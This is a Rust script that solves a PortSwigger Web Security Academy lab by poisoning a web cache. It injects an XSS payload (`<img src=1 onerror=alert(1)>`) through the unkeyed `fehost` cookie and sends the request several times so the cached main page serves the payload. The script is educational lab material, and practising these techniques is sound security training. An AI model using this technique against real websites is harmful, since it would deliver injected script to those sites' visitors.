/*************************************************************
*
* Lab: Web cache poisoning with an unkeyed cookie
*
* Hack Steps:
*      1. Inject payload into the unkeyed `fehost` cookie
*      2. Send multiple request to the main page to cache it
*         with the injected payload
*
**************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a3c00d20466f214805bdc30003800f0.web-security-academy.net";

fn main() {
    let payload = r###" "}</script><img src=1 onerror=alert(1)> "###;

    // send multiple request to cache the request
    // 5 is enough
    for i in 1..=5 {
        print!("\r❯❯ Poisoning the main page with an unkeyed cookie ({i}/5).. ");
        flush_terminal();

        poison_main_page(payload);
    }

    println!("{}", "OK".green());
    println!("🗹 The main page is poisoned successfully");
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn poison_main_page(payload: &str) -> Response {
    let client = build_web_client();
    client
        .get(format!("{LAB_URL}"))
        .header("Cookie", format!("fehost={payload}"))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to fetch the main page with the injected payload".red()
        ))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
